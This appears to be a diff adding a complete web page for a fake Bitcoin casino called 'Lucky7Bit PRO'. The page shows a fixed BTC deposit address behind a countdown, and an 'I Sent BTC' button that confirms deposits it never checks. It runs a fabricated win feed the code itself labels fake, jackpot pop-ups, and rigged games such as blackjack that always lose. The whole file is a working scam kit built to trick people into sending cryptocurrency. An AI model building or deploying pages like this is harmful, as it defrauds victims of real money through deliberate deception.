@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Lucky7Bit 🎰 PRO | Win 5 BTC Instantly</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Press+Start+2P&display=swap');
+
+    :root {
+      --glow: 0 0 15px;
+      --neon-red: #f00;
+      --neon-green: #0f0;
+      --neon-yellow: #ff0;
+      --neon-pink: #f0f;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      outline: none;
+    }
+
+    body, html {
+      height: 100%;
+      overflow-x: hidden;
+    }
+
+    body {
+      background: 
+        linear-gradient(rgba(0,0,0,0.3), rgba(0,0,0,0.7)),
+        url('https://i.imgur.com/9Vq3JzT.jpg') center/cover fixed;
+      color: #fff;
+      font-family: 'Orbitron', sans-serif;
+      padding: 20px;
+      position: relative;
+      animation: bgPan 60s infinite linear;
+    }
+
+    @keyframes bgPan {
+      0% { background-position: center 0%; }
+      100% { background-position: center 100%; }
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      pointer-events: none;
+      background: 
+        radial-gradient(circle at 20% 30%, rgba(255,0,255,0.1) 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(0,255,255,0.1) 0%, transparent 40%),
+        linear-gradient(45deg, transparent 49%, rgba(255,0,0,0.05) 50%, transparent 51%);
+      z-index: 1;
+      animation: overlayMove 30s infinite alternate;
+    }
+
+    @keyframes overlayMove {
+      0% { opacity: 0.3; transform: translate(0, 0); }
+      100% { opacity: 0.5; transform: translate(5px, 5px); }
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 20px;
+      text-shadow: var(--glow) var(--neon-pink), var(--glow) var(--neon-yellow);
+      z-index: 2;
+      position: relative;
+    }
+
+    .header h1 {
+      font-size: 4.5em;
+      color: var(--neon-yellow);
+      letter-spacing: 4px;
+      margin: 0;
+      text-shadow: 
+        0 0 10px var(--neon-yellow),
+        0 0 20px var(--neon-yellow),
+        0 0 30px var(--neon-pink);
+      animation: flicker 2s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0% { opacity: 0.8; text-shadow: 0 0 5px #ff0, 0 0 10px #ff0; }
+      100% { opacity: 1; text-shadow: 0 0 15px #ff0, 0 0 25px #f0f, 0 0 35px #f0f; }
+    }
+
+    .header p {
+      font-size: 1.3em;
+      color: var(--neon-green);
+      margin: 10px 0;
+    }
+
+    .deposit-box {
+      background: linear-gradient(45deg, #300, #500, #300);
+      border: 2px solid var(--neon-red);
+      border-radius: 18px;
+      padding: 30px;
+      text-align: center;
+      max-width: 800px;
+      margin: 25px auto;
+      box-shadow: 
+        0 0 20px var(--neon-red),
+        0 0 30px rgba(255,0,0,0.3);
+      z-index: 2;
+      position: relative;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 20px var(--neon-red); }
+      50% { box-shadow: 0 0 40px rgba(255,0,0,0.6); }
+      100% { box-shadow: 0 0 20px var(--neon-red); }
+    }
+
+    .btc-addr {
+      font-family: 'Courier New', monospace;
+      background: #000;
+      color: var(--neon-green);
+      padding: 15px;
+      border: 1px solid var(--neon-green);
+      border-radius: 10px;
+      display: block;
+      margin: 20px auto;
+      font-size: 1.4em;
+      width: 90%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      letter-spacing: 1px;
+      text-shadow: 0 0 5px var(--neon-green);
+    }
+
+    .deposit-btn {
+      background: var(--neon-red);
+      color: #fff;
+      border: none;
+      padding: 18px 40px;
+      font-size: 1.4em;
+      border-radius: 12px;
+      cursor: pointer;
+      margin: 15px;
+      animation: blink 1.2s infinite;
+      box-shadow: 0 0 20px rgba(255,0,0,0.5);
+      font-family: 'Orbitron';
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.8; transform: scale(1.05); }
+    }
+
+    .timer {
+      font-size: 1.6em;
+      color: var(--neon-red);
+      margin: 15px;
+      text-shadow: var(--glow) var(--neon-red);
+      font-family: 'Press Start 2P';
+      letter-spacing: 2px;
+    }
+
+    .games {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 25px;
+      margin: 50px 0;
+      z-index: 2;
+      position: relative;
+    }
+
+    .game {
+      background: rgba(0,0,0,0.8);
+      border: 2px solid #333;
+      border-radius: 15px;
+      width: 280px;
+      padding: 20px;
+      cursor: pointer;
+      transition: all 0.4s ease;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+      backdrop-filter: blur(5px);
+    }
+
+    .game:hover {
+      transform: translateY(-15px) scale(1.05);
+      border-color: var(--neon-green);
+      box-shadow: var(--glow) var(--neon-green), 0 0 25px rgba(0,255,0,0.3);
+    }
+
+    .game img {
+      width: 100%;
+      height: 160px;
+      object-fit: cover;
+      border-radius: 10px;
+      border: 1px solid var(--neon-green);
+    }
+
+    .game h3 {
+      margin: 15px 0;
+      color: var(--neon-yellow);
+      font-size: 1.4em;
+    }
+
+    .game p {
+      color: #aaa;
+      font-size: 0.9em;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.95);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+
+    .modal-content {
+      background: #000;
+      border: 3px solid var(--neon-red);
+      border-radius: 20px;
+      padding: 40px;
+      width: 95%;
+      max-width: 600px;
+      text-align: center;
+      box-shadow: var(--glow) var(--neon-red), 0 0 30px rgba(255,0,0,0.4);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .close {
+      color: var(--neon-red);
+      font-size: 3em;
+      cursor: pointer;
+      margin-top: 25px;
+      transition: 0.3s;
+      text-shadow: var(--glow) var(--neon-red);
+    }
+
+    .close:hover {
+      transform: scale(1.2);
+    }
+
+    .win-feed {
+      position: fixed;
+      bottom: 25px;
+      right: 25px;
+      background: rgba(0,0,0,0.9);
+      border: 2px solid var(--neon-green);
+      border-radius: 15px;
+      padding: 20px;
+      width: 350px;
+      max-height: 250px;
+      overflow-y: auto;
+      font-size: 0.95em;
+      z-index: 100;
+      box-shadow: var(--glow) var(--neon-green);
+      backdrop-filter: blur(3px);
+    }
+
+    .win-feed h4 {
+      color: var(--neon-green);
+      margin-bottom: 12px;
+      font-size: 1.1em;
+    }
+
+    .win-feed ul {
+      list-style: none;
+      padding-left: 0;
+    }
+
+    .win-feed li {
+      margin: 10px 0;
+      color: #fff;
+      font-size: 0.95em;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .win-feed span {
+      color: #0f0;
+      font-weight: bold;
+    }
+
+    .jackpot-popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #000;
+      border: 3px solid #ff0;
+      border-radius: 20px;
+      padding: 30px;
+      text-align: center;
+      z-index: 2000;
+      display: none;
+      box-shadow: 0 0 40px #ff0, 0 0 60px rgba(255,255,0,0.5);
+    }
+
+    .jackpot-popup h2 {
+      color: #ff0;
+      font-size: 3em;
+      text-shadow: 0 0 10px #ff0, 0 0 20px #ff0;
+      animation: shine 1.5s infinite alternate;
+    }
+
+    @keyframes shine {
+      from { text-shadow: 0 0 10px #ff0; }
+      to { text-shadow: 0 0 30px #ff0, 0 0 50px #ff8800; }
+    }
+
+    .confetti {
+      position: fixed;
+      width: 10px;
+      height: 10px;
+      background: #f00;
+      opacity: 0.7;
+      z-index: 9999;
+      pointer-events: none;
+      animation: fall linear forwards;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="overlay"></div>
+
+  <div class="header">
+    <h1>Lucky7Bit 💎 PRO</h1>
+    <p>🔴 LIVE JACKPOTS • 300% BONUS • 100% ANONYMOUS</p>
+  </div>
+
+  <div class="deposit-box">
+    <h2>🔥 DEPOSIT BTC & GET 300% BONUS!</h2>
+    <p>Send any amount to unlock instant credits:</p>
+    <input type="text" class="btc-addr" value="bc1qt4pw6tujqgv32cem25guhfsccg5x93yglj76d7" readonly onclick="this.select()">
+    <p><small>⚠️ Deposit within <strong id="timer">10:00</strong> to activate bonus!</small></p>
+    <button onclick="confirmDeposit()" class="deposit-btn">I Sent BTC</button>
+  </div>
+
+  <div class="timer">Next Jackpot Reset: <span id="countdown">10:00</span></div>
+
+  <div class="games">
+    <div class="game" onclick="openGame('slots')">
+      <img src="https://i.imgur.com/ZYqVdFk.gif" alt="Slots">
+      <h3>⚡ Mega Jackpot Slots</h3>
+      <p>Spin & Win Up To 5 BTC!</p>
+    </div>
+    <div class="game" onclick="openGame('blackjack')">
+      <img src="https://i.imgur.com/5kqVZrW.jpg" alt="Blackjack">
+      <h3>🂡 VIP Blackjack</h3>
+      <p>Beat the Dealer, Cash Out Fast</p>
+    </div>
+    <div class="game" onclick="openGame('roulette')">
+      <img src="https://i.imgur.com/8JmRb3N.gif" alt="Roulette">
+      <h3>🔴 Live Roulette</h3>
+      <p>Bet Red/Black, Double Your BTC</p>
+    </div>
+    <div class="game" onclick="openGame('dice')">
+      <img src="https://i.imgur.com/3Q1zK9r.png" alt="Dice">
+      <h3>🎲 High Rollers Dice</h3>
+      <p>Roll Under 50 to Win 2x</p>
+    </div>
+    <div class="game" onclick="openGame('crash')">
+      <img src="https://i.imgur.com/7uWqL0g.gif" alt="Crash">
+      <h3>🚀 BTC Crash Game</h3>
+      <p>Cash out before it crashes!</p>
+    </div>
+  </div>
+
+  <div class="win-feed">
+    <h4>🚨 LIVE WIN FEED (FAKE):</h4>
+    <ul id="winLog">
+      <li><span>+1.2 BTC</span> won on Slots by <strong>user_x99</strong></li>
+      <li><span>+0.5 BTC</span> won on Roulette by <strong>anon_tor</strong></li>
+      <li><span>+2.1 BTC</span> Jackpot! by <strong>lucky7</strong></li>
+    </ul>
+  </div>
+
+  <!-- Game Modal -->
+  <div id="gameModal" class="modal">
+    <div class="modal-content">
+      <h2 id="gameTitle">Game</h2>
+      <div id="gameBody"></div>
+      <div class="close" onclick="closeModal()">×</div>
+    </div>
+  </div>
+
+  <!-- JACKPOT POPUP -->
+  <div class="jackpot-popup" id="jackpotPop">
+    <h2>🎉 JACKPOT WON!</h2>
+    <p style="color:#ff0;font-size:1.5em;"><strong>+2.5 BTC</strong> to user_tor!</p>
+    <p>This could be YOU!</p>
+  </div>
+
+  <script>
+    let balance = 0.0;
+    const btcAddr = "bc1qt4pw6tujqgv32cem25guhfsccg5x93yglj76d7";
+    const users = ["user_tor", "btc_king", "darklord", "lucky7", "ghost", "xminer", "sniper", "whale", "king", "ace"];
+    const games = ["Slots", "Roulette", "Blackjack", "Dice", "Crash"];
+
+    // === CONFETTI EFFECT ===
+    function createConfetti() {
+      for (let i = 0; i < 100; i++) {
+        const conf = document.createElement("div");
+        conf.classList.add("confetti");
+        conf.style.left = Math.random() * 100 + "vw";
+        conf.style.backgroundColor = ["#f00", "#0f0", "#00f", "#ff0", "#f0f"][Math.floor(Math.random() * 5)];
+        conf.style.animationDuration = Math.random() * 3 + 2 + "s";
+        conf.style.animation = "fall linear forwards";
+        document.body.appendChild(conf);
+        setTimeout(() => conf.remove(), 5000);
+      }
+    }
+
+    // === JACKPOT POPUP ===
+    function showJackpot() {
+      const pop = document.getElementById("jackpotPop");
+      pop.style.display = "block";
+      createConfetti();
+      setTimeout(() => {
+        pop.style.display = "none";
+      }, 5000);
+    }
+
+    // === FAKE WIN FEED ===
+    function addFakeWin() {
+      const log = document.getElementById("winLog");
+      const user = users[Math.floor(Math.random() * users.length)];
+      let amount;
+      // 10% chance of 2+ BTC win
+      if (Math.random() < 0.1) {
+        amount = (Math.random() * 3 + 2).toFixed(3); // 2.0 - 5.0 BTC
+        setTimeout(showJackpot, 1000);
+      } else {
+        amount = (Math.random() * 1.5 + 0.1).toFixed(3);
+      }
+      const game = games[Math.floor(Math.random() * games.length)];
+      const item = document.createElement("li");
+      item.innerHTML = `<span>+${amount} BTC</span> won on ${game} by <strong>${user}</strong>`;
+      log.insertBefore(item, log.firstChild);
+      if (log.children.length > 20) log.lastElementChild.remove();
+    }
+
+    setInterval(addFakeWin, Math.random() * 20000 + 25000);
+    addFakeWin();
+
+    // === COUNTDOWN ===
+    let time = 600;
+    const cd = document.getElementById("countdown");
+    const timer = setInterval(() => {
+      const mins = Math.floor(time / 60);
+      const secs = time % 60;
+      cd.textContent = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+      if (time <= 0) {
+        clearInterval(timer);
+        cd.textContent = "RESET!";
+        alert("🎉 JACKPOT JUST WON! Deposit now for next round!");
+        time = 600;
+        setTimeout(() => { cd.textContent = "10:00"; startTimer(); }, 2000);
+      }
+      time--;
+    }, 1000);
+
+    function startTimer() {
+      setInterval(() => {
+        if (time > 0) {
+          time--;
+          const mins = Math.floor(time / 60);
+          const secs = time % 60;
+          cd.textContent = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+      }, 1000);
+    }
+
+    // === DEPOSIT CONFIRM ===
+    function confirmDeposit() {
+      alert("✅ Deposit confirmed! Balance updating in 2-3 minutes...");
+      setTimeout(() => {
+        const bonus = (Math.random() * 0.1 + 0.02).toFixed(5);
+        alert(`💸 +${bonus} BTC credited! Play now!`);
+        balance += parseFloat(bonus);
+      }, 3000);
+    }
+
+    // === MODAL SYSTEM ===
+    function openGame(game) {
+      document.getElementById("gameModal").style.display = "flex";
+      document.getElementById("gameTitle").textContent = getGameTitle(game);
+      document.getElementById("gameBody").innerHTML = getGameHTML(game);
+    }
+
+    function closeModal() {
+      document.getElementById("gameModal").style.display = "none";
+    }
+
+    function getGameTitle(game) {
+      return {
+        slots: "🎰 MEGA SLOTS JACKPOT",
+        blackjack: "🂡 VIP BLACKJACK",
+        roulette: "🔴 LIVE ROULETTE",
+        dice: "🎲 ROLL UNDER 50",
+        crash: "🚀 BTC CRASH"
+      }[game] || "Game";
+    }
+
+    function getGameHTML(game) {
+      switch (game) {
+        case "slots":
+          return `
+            <p>Balance: <strong>${balance.toFixed(5)} BTC</strong></p>
+            <div style="font-size:5em; text-align:center; margin:30px 0; letter-spacing:20px;">
+              <span id="s1">🍋</span><span id="s2">🔔</span><span id="s3">7️⃣</span>
+            </div>
+            <button onclick="spinSlots()" style="font-size:1.6em; padding:20px 40px; background:#f00; color:#fff; border:none; border-radius:12px; box-shadow:0 0 20px rgba(255,0,0,0.5);">
+              🔥 SPIN (0.002 BTC)
+            </button>
+            <p id="slotResult" style="margin-top:20px; font-size:1.2em; font-weight:bold; color:#ff0;"></p>
+          `;
+
+        case "blackjack":
+          return `
+            <p>Balance: <strong>${balance.toFixed(5)} BTC</strong></p>
+            <p>Your Hand: <span id="player">A, 5</span> (16)</p>
+            <p>Dealer: <span id="dealer">?</span> + ??</p>
+            <div style="margin:25px 0;">
+              <button onclick="hitBJ()" style="padding:12px 25px; background:#00f; color:#fff; border:none; border-radius:6px; margin:0 10px;">Hit</button>
+              <button onclick="standBJ()" style="padding:12px 25px; background:#0f0; color:#000; border:none; border-radius:6px; margin:0 10px;">Stand</button>
+            </div>
+            <p id="bjResult" style="margin-top:15px; font-size:1.1em; color:#ff0;"></p>
+          `;
+
+        case "roulette":
+          return `
+            <p>Balance: <strong>${balance.toFixed(5)} BTC</strong></p>
+            <img src="https://i.imgur.com/8JmRb3N.gif" width="220" style="margin:20px;">
+            <p>Bet on color:</p>
+            <button onclick="betRoulette('red')" style="background:#f00; color:#fff; padding:12px 25px; border:none; border-radius:6px; margin:0 5px;">🔴 Red</button>
+            <button onclick="betRoulette('black')" style="background:#000; color:#fff; padding:12px 25px; border:none; border-radius:6px; margin:0 5px;">⚫ Black</button>
+            <p id="rouletteResult" style="margin-top:20px; font-weight:bold; color:#ff0;"></p>
+          `;
+
+        case "dice":
+          return `
+            <p>Balance: <strong>${balance.toFixed(5)} BTC</strong></p>
+            <p>🎯 Goal: Roll Under <strong>50</strong> → Win <strong>2x</strong></p>
+            <input type="number" id="betAmount" value="0.002" min="0.001" max="${balance}" step="0.001" style="padding:12px; width:120px; text-align:center;">
+            <button onclick="rollDice()" style="padding:12px 25px; background:#0f0; color:#000; border:none; border-radius:6px; margin-left:10px;">ROLL</button>
+            <p id="diceResult" style="margin-top:20px; font-weight:bold; color:#ff0;"></p>
+          `;
+
+        case "crash":
+          return `
+            <p>Balance: <strong>${balance.toFixed(5)} BTC</strong></p>
+            <p>Multiplicator: <span id="crashValue" style="font-size:1.8em; color:#0f0;">1.00x</span></p>
+            <button onclick="startCrash()" id="crashBtn" style="padding:20px 40px; background:#00f; color:#fff; border:none; border-radius:10px; font-size:1.2em;">
+              BET 0.002 BTC
+            </button>
+            <p id="crashResult" style="margin-top:20px; font-weight:bold; color:#ff0;"></p>
+          `;
+
+        default:
+          return "<p>Game not found.</p>";
+      }
+    }
+
+    // === SLOTS ===
+    function spinSlots() {
+      if (balance < 0.002) return alert("❌ Not enough BTC!");
+      balance -= 0.002;
+      document.getElementById("slotResult").textContent = "🎰 Spinning...";
+      const reels = ["🍒", "🍋", "🔔", "7️⃣", "💎", "🍀", "🍑", "🍉"];
+      let spins = 0;
+      const s1 = document.getElementById("s1");
+      const s2 = document.getElementById("s2");
+      const s3 = document.getElementById("s3");
+      const interval = setInterval(() => {
+        s1.textContent = reels[Math.floor(Math.random() * reels.length)];
+        s2.textContent = reels[Math.floor(Math.random() * reels.length)];
+        s3.textContent = reels[Math.floor(Math.random() * reels.length)];
+        spins++;
+        if (spins > 20) {
+          clearInterval(interval);
+          const win = Math.random() < 0.15;
+          if (win) {
+            const prize = parseFloat((0.01 + Math.random() * 0.02).toFixed(5));
+            balance += prize;
+            document.getElementById("slotResult").innerHTML = `🎉 JACKPOT! +${prize} BTC!`;
+            if (prize > 0.02) setTimeout(showJackpot, 500);
+          } else {
+            document.getElementById("slotResult").textContent = "❌ Try again!";
+          }
+        }
+      }, 150);
+    }
+
+    function hitBJ() { document.getElementById("bjResult").textContent = "❌ Dealer has 21. You lose."; }
+    function standBJ() { document.getElementById("bjResult").textContent = "🔴 Dealer wins with 20."; }
+
+    function betRoulette(color) {
+      const win = Math.random() < 0.45;
+      const result = document.getElementById("rouletteResult");
+      if (win) {
+        balance += 0.002;
+        result.innerHTML = `🎉 Won 0.002 BTC!`;
+        if (Math.random() < 0.2) setTimeout(showJackpot, 1000);
+      } else {
+        result.textContent = "🔴 Lost.";
+      }
+    }
+
+    function rollDice() {
+      const bet = parseFloat(document.getElementById("betAmount").value);
+      if (isNaN(bet) || bet < 0.001 || bet > balance) return alert("Invalid bet!");
+      const roll = Math.floor(Math.random() * 100);
+      const result = document.getElementById("diceResult");
+      result.textContent = `Rolled: ${roll}`;
+      if (roll < 50) {
+        const win = bet * 2;
+        balance += win - bet;
+        result.innerHTML += ` 🎉 Win! +${(win - bet).toFixed(5)} BTC!`;
+        if (win - bet > 0.01) setTimeout(showJackpot, 500);
+      } else {
+        balance -= bet;
+        result.textContent += " ❌ Lost.";
+      }
+    }
+
+    function startCrash() {
+      const btn = document.getElementById("crashBtn");
+      btn.disabled = true;
+      let mult = 1.00;
+      const display = document.getElementById("crashValue");
+      const result = document.getElementById("crashResult");
+      result.textContent = "";
+      const interval = setInterval(() => {
+        mult += 0.15;
+        display.textContent = mult.toFixed(2) + "x";
+        if (Math.random() < 0.1) {
+          clearInterval(interval);
+          display.style.color = "#f00";
+          result.textContent = `💥 CRASHED at ${mult.toFixed(2)}x!`;
+          btn.disabled = false;
+          if (mult > 2.0) {
+            const win = 0.002 * mult;
+            balance += win;
+            alert(`🎉 You would have won ${win.toFixed(5)} BTC!`);
+            if (win > 0.005) setTimeout(showJackpot, 500);
+          }
+        }
+      }, 250);
+    }
+
+    document.querySelector('.btc-addr').addEventListener('click', function() {
+      this.select();
+      document.execCommand('copy');
+      alert("BTC address copied to clipboard!");
+    });
+  </script>
+</body>
+</html>
